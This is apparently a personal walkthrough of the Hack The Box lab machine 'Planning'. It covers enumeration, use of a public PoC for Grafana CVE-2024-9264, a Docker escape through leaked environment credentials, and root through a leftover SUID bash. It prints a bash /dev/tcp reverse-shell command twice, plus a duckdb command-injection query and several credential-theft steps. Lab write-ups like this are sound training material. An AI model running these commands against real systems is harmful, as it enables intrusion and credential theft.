## Reference info
- My IP: `10.10.14.173`
- Target IP: `10.10.11.68`
- Grafana Credentials: `admin:0D5oT70Fq13EvB5r` (given without service name)
- User Credentials: `enzo:RioTecRANDEntANT!` (discovered)
## Enumeration
### `nmap`
- Let's see it...
```a
[lkotlus@work] [~/Nerd/htb/planning]    
(bash)> nmap -sV -sC -p- 10.10.11.68  
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-07 11:17 -0400  
Nmap scan report for planning.htb (10.10.11.68)  
Host is up (0.021s latency).  
  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)  
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)  
80/tcp open  http    nginx 1.24.0 (Ubuntu)  
|_http-title: Edukate - Online Education Website  
|_http-server-header: nginx/1.24.0 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 7.29 seconds
```
- Some interesting stuff here. I know better than to attempt any comprehensive exploit searches on the present SSH and nginx. A quick `searchsploit` comes up blank, no surprise there. 

### `gobuster`
#### Directories
- Let's see what we get:
```a
[lkotlus@work] [~/Nerd/htb/planning]    
(bash)> gobuster dir -u http://planning.htb/ -w ~/Nerd/wordlists/SecLists/Discovery/Web-Content/common.txt  
===============================================================  
Gobuster v3.7  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://planning.htb/  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /home/lkotlus/Nerd/wordlists/SecLists/Discovery/Web-Content/common.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.7  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/css                  (Status: 301) [Size: 178] [--> http://planning.htb/css/]  
/img                  (Status: 301) [Size: 178] [--> http://planning.htb/img/]  
/index.php            (Status: 200) [Size: 23914]  
/js                   (Status: 301) [Size: 178] [--> http://planning.htb/js/]  
/lib                  (Status: 301) [Size: 178] [--> http://planning.htb/lib/]  
Progress: 4734 / 4734 (100.00%)  
===============================================================  
Finished  
===============================================================
```
- This all looks pretty standard. The only thing that actually got a 200 status was the index page, though.
#### Subdomains
- Just hoping that this works, trying `vhost` scanning rather than plain DNS. This should work a lot better.
```a
[lkotlus@work] [~/Nerd/htb/planning]    
(bash)> gobuster vhost -u http://planning.htb -w ~/Nerd/wordlists/SecLists/Discovery/DNS/namelist.txt --append-domain  
===============================================================  
Gobuster v3.7  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:             http://planning.htb  
[+] Method:          GET  
[+] Threads:         10  
[+] Wordlist:        /home/lkotlus/Nerd/wordlists/SecLists/Discovery/DNS/namelist.txt  
[+] User Agent:      gobuster/3.7  
[+] Timeout:         10s  
[+] Append Domain:   true  
===============================================================  
Starting gobuster in VHOST enumeration mode  
===============================================================  
grafana.planning.htb Status: 302 [Size: 29] [--> /login]  
http://enquetes.planning.htb Status: 400 [Size: 166]  
...
https://www.planning.htb Status: 400 [Size: 166]  
Progress: 151265 / 151265 (100.00%)  
===============================================================  
Finished  
===============================================================
```
- And look at that!

### Base Domain
- This looks like a regular education site, it's just hosting some courses.
- It's a well made site, but it's using PHP, so that seems silly.
- There's tons of form submissions for contact and course enrollment. There could be some things to look into there.
- Some of the comments in the source code a Spanish, which is interesting. It could be worth looking into that more.
- Nothing is ringing any alarms here.
- Some things:
	- Rose Mary teaches Web Design
	- Bob Moss teaches Web Development
	- Stella Haks teaches Marketing
- All the `jQuery` libraries would appear to be safe. We're running `jQuery v3.4.1`, which has a CVE related to XSS, but nothing particularly relevant.

### Grafana Page
- It looks like `vhost` scanning is the way to go!
- We're running `Grafana v11.0.0`. The subdomain sends me straight to a login page.
- Well what do we have here: [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/cve-2024-9264)
> The SQL Expressions experimental feature of Grafana allows for the evaluation of `duckdb` queries containing user input. These queries are insufficiently sanitized before being passed to `duckdb`, leading to a command injection and local file inclusion vulnerability. Any user with the VIEWER or higher permission is capable of executing this attack. The `duckdb` binary must be present in Grafana's `$PATH` for this attack to function; by default, this binary is not installed in Grafana distributions.
- So there is an exploit, but we're going to need some credentials. Default login is `admin:admin`, so let's try that out... nope.
- That should be expected, it isn't 2018 anymore.
- It's worth noting that we aren't getting locked out. I could attempt a brute force.
- I could try out some SQL injections on the root domain, if I can leak credentials from there they can potentially be reused for the Grafana login.
- I could try out the instructor usernames, something like `bmoss@planning.htb` with weak passwords.

## Foothold
### Grafana Login
- So I have a list of possible usernames:
```txt
admin
grafana
rmary
bmoss
shaks
admin@planning.htb
grafana@planning.htb
rmary@planning.htb
bmoss@planning.htb
shaks@planning.htb
```
- I'll start a cluster bomb attack in Burp and see how it goes. I'll be back after lunch :)
- WOW! So if you read carefully in the box description, they give the login for this.
```a
admin:0D5oT70Fq13EvB5r
```
- That's fine. I'm fine. So we have a login and the vulnerability. I see a [PoC script](https://github.com/nollium/CVE-2024-9264), so let's try that out. 
```a
[lkotlus@work] [.../Nerd/htb/planning/CVE-2024-9264] [ main]  
(bash)> python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.173/8000 0>&1\"" http://grafana.planning.htb/  
[+] Logged in as admin:0D5oT70Fq13EvB5r  
[+] Executing command: /bin/bash -c "bash -i >& /dev/tcp/10.10.14.173/8000 0>&1"
```
- And while listening on that port...
```a
[lkotlus@work] [~/Nerd/htb/planning]    
(bash)> nc -nlvp 8000  
Connection from 10.10.11.68:49190  
bash: cannot set terminal process group (1): Inappropriate ioctl for device  
bash: no job control in this shell  
root@7ce659d667d7:~#
```
- Popped a shell!

## Lateral Movement Part 1 (Escape Docker)
### What's Going On
- So I'm very clearly inside a docker container. This is most evident by the bash prompt, which is `root@[hex]`. Firstly, this exploit definitely won't give root, even on an easy machine. Secondly, the hex is a dead giveaway.
- There's a `grafana` user, that's neat. Luckily I'm able to run and do anything within the container itself, so that's really good.
- There's two general ideas I'm formulating. They may or may not be good, I've never really done this before.
	1. Find a shared directory
	2. Find reused credentials
- This is really all I can go for.
### Grafana Password Dump
- There's one service running on this bad boy: Grafana. It stands to reason that there's usernames and passwords somewhere in here. If I can crack a hash, then I can attempt to use it for SSH.
- The database is located in `/var/lib/grafana/`. This shell isn't particularly fancy, so we can just use the same exploit used to generate the shell, but with a command printing the contents of the database. The output of that can then be redirected to a file, and...
```a
[lkotlus@work] [.../Nerd/htb/planning/CVE-2024-9264] [ main]  
(bash)> python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "cat /var/lib/  
grafana/grafana.db" http://grafana.planning.htb/ > grafana.db  
[+] Logged in as admin:0D5oT70Fq13EvB5r  
  
[+] Executing command: cat /var/lib/grafana/grafana.db  
[+] Successfully ran duckdb query:  
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM    
read_csv('cat /var/lib/grafana/grafana.db >/tmp/grafana_cmd_output 2>&1 |'):  
  
[+] Successfully ran duckdb query:  
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):  
  
[lkotlus@work] [.../Nerd/htb/planning/CVE-2024-9264] [ main]  
(bash)> sqlite3 grafana.db    
SQLite version 3.50.3 2025-07-17 13:25:10  
Enter ".help" for usage hints.  
sqlite> .tables  
alert                        library_element_connection    
alert_configuration          login_attempt
```
- Voila! Unfortunately the only user available is the `admin` user.
### File Shares and Mounts
- Let's see if `/proc/mounts` has anything interesting:
```a
root@7ce659d667d7:~# cat /proc/mounts  
cat /proc/mounts  
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/3X4OJGQ2VFLUPGUBU2QSGDA67Q:/var/lib/docker/overlay2/l/WKSUASLWRLDJ5Z3HUM3UWOCERN:/var/lib/docker/overlay2/l/FNIAPVIFHONGK5UUW  
ODDB3HIEZ:/var/lib/docker/overlay2/l/TQFT6TIJRPQ7JPRYGS3IZSMHZD:/var/lib/docker/overlay2/l/ZNRJYR4L6MSXWYNEVHMA7SOK4K:/var/lib/docker/overlay2/l/7VFG4MJXMKBY4JRM3RMBIKDDGI:/var/lib/docker/ove  
rlay2/l/QB5XD7D4U5DQ22OYSUX6QDX24V:/var/lib/docker/overlay2/l/QVCFBNTZYDNPP6DXABR4R4N2K6:/var/lib/docker/overlay2/l/SYGRYVYZM5LKLX5UBPKUWAV7ZF:/var/lib/docker/overlay2/l/AKAAOHAM5BHB3XSZYHXJJ  
7L5CZ:/var/lib/docker/overlay2/l/FMIYHYMPSESM3E3C6JPZWCBKWY:/var/lib/docker/overlay2/l/OAC6WUQ3B4JTAEKGVTRLUU4D2N:/var/lib/docker/overlay2/l/BBMA3AJS2WGZ55ID5AHIUVNGRU,upperdir=/var/lib/docke  
r/overlay2/dd276dc3c44059747fa6dbb0289cda02c4f20798df65f186eb63ef1f46bab04f/diff,workdir=/var/lib/docker/overlay2/dd276dc3c44059747fa6dbb0289cda02c4f20798df65f186eb63ef1f46bab04f/work,nouserx  
attr 0 0  
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0  
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0  
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0  
sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0  
cgroup /sys/fs/cgroup cgroup2 ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot 0 0  
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0  
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k,inode64 0 0  
/dev/mapper/ubuntu--vg-ubuntu--lv /etc/resolv.conf ext4 rw,relatime 0 0  
/dev/mapper/ubuntu--vg-ubuntu--lv /etc/hostname ext4 rw,relatime 0 0  
/dev/mapper/ubuntu--vg-ubuntu--lv /etc/hosts ext4 rw,relatime 0 0  
/dev/mapper/ubuntu--vg-ubuntu--lv /var/lib/grafana ext4 rw,relatime 0 0  
proc /proc/bus proc ro,nosuid,nodev,noexec,relatime 0 0  
proc /proc/fs proc ro,nosuid,nodev,noexec,relatime 0 0  
proc /proc/irq proc ro,nosuid,nodev,noexec,relatime 0 0  
proc /proc/sys proc ro,nosuid,nodev,noexec,relatime 0 0  
proc /proc/sysrq-trigger proc ro,nosuid,nodev,noexec,relatime 0 0  
tmpfs /proc/acpi tmpfs ro,relatime,inode64 0 0  
tmpfs /proc/kcore tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0  
tmpfs /proc/keys tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0  
tmpfs /proc/latency_stats tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0  
tmpfs /proc/timer_list tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0  
tmpfs /proc/scsi tmpfs ro,relatime,inode64 0 0  
tmpfs /sys/firmware tmpfs ro,relatime,inode64 0 0
```
- Looks like no.  Some more checks, and this all looks standard:
```a
root@7ce659d667d7:~# df -hT  
df -hT  
Filesystem                        Type     Size  Used Avail Use% Mounted on  
overlay                           overlay  6.4G  4.2G  1.9G  69% /  
tmpfs                             tmpfs     64M     0   64M   0% /dev  
shm                               tmpfs     64M     0   64M   0% /dev/shm  
/dev/mapper/ubuntu--vg-ubuntu--lv ext4     6.4G  4.2G  1.9G  69% /etc/hosts  
tmpfs                             tmpfs    928M     0  928M   0% /proc/acpi  
tmpfs                             tmpfs    928M     0  928M   0% /proc/scsi  
tmpfs                             tmpfs    928M     0  928M   0% /sys/firmware
```
### `deepce`
- Found this tool online. Let's check it out!
- Unfortunately, I can't reach `github.com` from the container. Huge issue there.
- I can download it to the attack machine, and then host it with `http.server`:
```a
[lkotlus@work] [~/Nerd/htb/planning]    
(bash)> python3 -m http.server 8888  
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```
- I know that the container can reach the attack machine, so now we can `wget` with the attack machine IP:
```a
root@7ce659d667d7:~# wget http://10.10.14.173:8888/deepce.sh
wget http://10.10.14.173:8888/deepce.sh
--2025-08-07 19:26:12--  http://10.10.14.173:8888/deepce.sh
Connecting to 10.10.14.173:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 39417 (38K) [application/x-sh]
Saving to: 'deepce.sh'

     0K .......... .......... .......... ........             100% 4.89M=0.008s

2025-08-07 19:26:12 (4.89 MB/s) - 'deepce.sh' saved [39417/39417]
```
- And now we just run the tool... and it doesn't find anything particularly interesting. 
### `docker-escape`
- Maybe this will work...
- Same general process, I download the binary from the releases page on GitHub and then host it with `http.server`. After that, I just use `wget` on the container to download it.
- And the script just crashes. That's rough.
### `gdk`
- Another tool!
- Same upload process. I run it and it seems as if we still don't have anything interesting... but then it says that [CVE-2021-22555](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html) might be viable. 
- This means that some of the escape scripts might work.
- Maybe I can do something with Grafana?
### `linpeas`
- Let's see if ol' reliable gives us something...
- That's cool! We have a username and password in the environment variables:
```a
╔══════════╣ Environment  
╚ Any private information inside environment variables?  
GF_PATHS_HOME=/usr/share/grafana  
HOSTNAME=7ce659d667d7  
AWS_AUTH_EXTERNAL_ID=  
SHLVL=2  
HOME=/usr/share/grafana  
OLDPWD=/var/lib/grafana  
AWS_AUTH_AssumeRoleEnabled=true  
GF_PATHS_LOGS=/var/log/grafana  
_=./linpeas.sh  
GF_PATHS_PROVISIONING=/etc/grafana/provisioning  
GF_PATHS_PLUGINS=/var/lib/grafana/plugins  
AWS_AUTH_AllowedAuthProviders=default,keys,credentials  
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!  
AWS_AUTH_SESSION_DURATION=15m  
GF_SECURITY_ADMIN_USER=enzo  
GF_PATHS_DATA=/var/lib/grafana  
GF_PATHS_CONFIG=/etc/grafana/grafana.ini  
AWS_CW_LIST_METRICS_PAGE_LIMIT=500  
PWD=/usr/share/grafana
```
- So there's `enzo:RioTecRANDEntANT!`
- Let's try SSH:
```a
[lkotlus@work] [~/Nerd/htb/planning]    
(bash)> ssh enzo@planning.htb  
enzo@planning.htb's password:    
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/pro  
  
System information as of Thu Aug  7 09:03:07 PM UTC 2025  
  
 System load:  0.0               Processes:             250  
 Usage of /:   70.1% of 6.30GB   Users logged in:       1  
 Memory usage: 54%               IPv4 address for eth0: 10.10.11.68  
 Swap usage:   0%  
  
  
Expanded Security Maintenance for Applications is not enabled.  
  
102 updates can be applied immediately.  
77 of these updates are standard security updates.  
To see these additional updates run: apt list --upgradable  
  
1 additional security update can be applied with ESM Apps.  
Learn more about enabling ESM Apps service at https://ubuntu.com/esm  
  
  
The list of available updates is more than a week old.  
To check for new updates run: sudo apt update  
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings  
  
Last login: Thu Aug 7 21:03:08 2025 from 10.10.14.173  
enzo@planning:~$
```
- There it is!

## Lateral Movement Part 2 (Root)
- Firstly:
```a
enzo@planning:~$ cat user.txt  
f856ea56796cb30cb62b34d710906212
```
- Very good. Let's just spam `linpeas`, because it looks like that's just what works for me.
### `linpeas` (again)
- Nothing particularly crazy...
- I lied :)
```a
╔══════════╣ SUID - Check easy privesc, exploits and write perms  
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid  
ICMP is not accessible  
-rwsr-xr-x 1 root root 19K Dec  2  2024 /usr/lib/polkit-1/polkit-agent-helper-1  
-rwsr-xr-x 1 root root 335K Apr 22 11:51 /usr/lib/openssh/ssh-keysign  
-rwsr-xr-- 1 root messagebus 35K Aug  9  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper  
-rwsr-xr-x 1 root root 39K Dec  5  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)  
-rwsr-xr-x 1 root root 51K Dec  5  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8  
-rwsr-xr-x 1 root root 272K Jun 25 12:42 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable  
-rwsr-xr-x 1 root root 63K May 30  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)  
-rwsr-xr-x 1 root root 44K May 30  2024 /usr/bin/chsh  
-rwsr-xr-x 1 root root 40K May 30  2024 /usr/bin/newgrp  --->  HP-UX_10.20  
-rwsr-xr-x 1 root root 72K May 30  2024 /usr/bin/chfn  --->  SuSE_9.3/10  
-rwsr-xr-x 1 root root 39K Apr  8  2024 /usr/bin/fusermount3  
-rwsr-xr-x 1 root root 55K Dec  5  2024 /usr/bin/su  
-rwsr-xr-x 1 root root 75K May 30  2024 /usr/bin/gpasswd  
-rwsr-xr-x 1 root root 1.4M Aug  7 19:59 /tmp/bash
```
- See that lil' `/tmp/bash` there? It has SUID for `root`. If I just do `/tmp/bash -p` (`-p` preserves the `euid` of the caller), then I have a root shell. It's almost too easy.
```a
enzo@planning:~$ /tmp/bash -p  
bash-5.2# whoami  
root
```
- I can't believe that worked. Claim the treasure:
```a
bash-5.2# cd /root  
bash-5.2# cat root.txt  
a69721897410e2d49f3fa66ccd864278
```

## Post-Machine Review
### Exploitation Path
- Start by finding the Grafana subdomain at `grafana.planning.htb`. Login with the given credentials, `admin:0D5oT70Fq13EvB5r`.
 - Use the PoC to run a reverse shell
 ```a
[lkotlus@work] [.../Nerd/htb/planning/CVE-2024-9264] [ main]  
(bash)> python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.173/8000 0>&1\"" http://grafana.planning.htb/  
[+] Logged in as admin:0D5oT70Fq13EvB5r  
[+] Executing command: /bin/bash -c "bash -i >& /dev/tcp/10.10.14.173/8000 0>&1"
```
- Listen on the correct port and pop the foothold shell.
```a
[lkotlus@work] [~/Nerd/htb/planning]    
(bash)> nc -nlvp 8000  
Connection from 10.10.11.68:49190  
bash: cannot set terminal process group (1): Inappropriate ioctl for device  
bash: no job control in this shell  
root@7ce659d667d7:~#
```
- Check environment variable to see:
```a
GF_PATHS_HOME=/usr/share/grafana  
HOSTNAME=7ce659d667d7  
AWS_AUTH_EXTERNAL_ID=  
SHLVL=2  
HOME=/usr/share/grafana  
OLDPWD=/var/lib/grafana  
AWS_AUTH_AssumeRoleEnabled=true  
GF_PATHS_LOGS=/var/log/grafana  
_=./linpeas.sh  
GF_PATHS_PROVISIONING=/etc/grafana/provisioning  
GF_PATHS_PLUGINS=/var/lib/grafana/plugins  
AWS_AUTH_AllowedAuthProviders=default,keys,credentials  
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!  
AWS_AUTH_SESSION_DURATION=15m  
GF_SECURITY_ADMIN_USER=enzo  
GF_PATHS_DATA=/var/lib/grafana  
GF_PATHS_CONFIG=/etc/grafana/grafana.ini  
AWS_CW_LIST_METRICS_PAGE_LIMIT=500  
PWD=/usr/share/grafana
```
- This leaks credentials `enzo:RioTecRANDEntANT!`, and we can login with this via SSH:
```a
[lkotlus@work] [~/Nerd/htb/planning]    
(bash)> ssh enzo@planning.htb  
enzo@planning.htb's password:    
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/pro  
  
System information as of Thu Aug  7 09:03:07 PM UTC 2025  
  
 System load:  0.0               Processes:             250  
 Usage of /:   70.1% of 6.30GB   Users logged in:       1  
 Memory usage: 54%               IPv4 address for eth0: 10.10.11.68  
 Swap usage:   0%  
  
  
Expanded Security Maintenance for Applications is not enabled.  
  
102 updates can be applied immediately.  
77 of these updates are standard security updates.  
To see these additional updates run: apt list --upgradable  
  
1 additional security update can be applied with ESM Apps.  
Learn more about enabling ESM Apps service at https://ubuntu.com/esm  
  
  
The list of available updates is more than a week old.  
To check for new updates run: sudo apt update  
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings  
  
Last login: Thu Aug 7 21:03:08 2025 from 10.10.14.173  
enzo@planning:~$
```
- From here, look at files with sticky bits and `root` ownership to see:
```a
-rwsr-xr-x 1 root root 1.4M Aug  7 19:59 /tmp/bash
```
- From here, it's easy to get root:
```a
enzo@planning:~$ /tmp/bash -p  
bash-5.2# whoami  
root
```

### Lessons Learned
- Essentially just check environment variables. 
- Really, just always use `linpeas.sh`.